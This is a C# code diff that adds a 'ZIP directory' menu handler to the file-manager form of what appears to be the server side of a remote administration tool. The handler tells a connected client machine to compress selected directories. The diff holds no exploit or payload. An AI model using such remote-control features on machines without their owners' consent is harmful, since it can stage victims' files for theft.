@@ -94,7 +94,25 @@ namespace xServer.Forms
                 }
             }
         }
+        private void zIPDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem files in lstDirectory.SelectedItems)
+            {
+                // Check if the item we have is actually a directory and the client that we're on is not null (disconnected/etc)
+                if (files.Tag.ToString() != "dir" || _connectClient == null)
+                    continue;
 
+                // Grab the path
+                string path = _currentDir;
+                if (path.EndsWith(@"\"))
+                    path += files.SubItems[0].Text;
+                else
+                    path += @"\" + files.SubItems[0].Text;
+                
+                // Send a new packet to pack that directory.
+                new Core.Packets.ServerPackets.ZipFile(path).Execute(_connectClient);
+            }
+        }
         private void ctxtDownload_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem files in lstDirectory.SelectedItems)
@@ -305,5 +323,7 @@ namespace xServer.Forms
             // Perform the sort with these new sort options.
             lstDirectory.Sort();
         }
+
+        
     }
 }
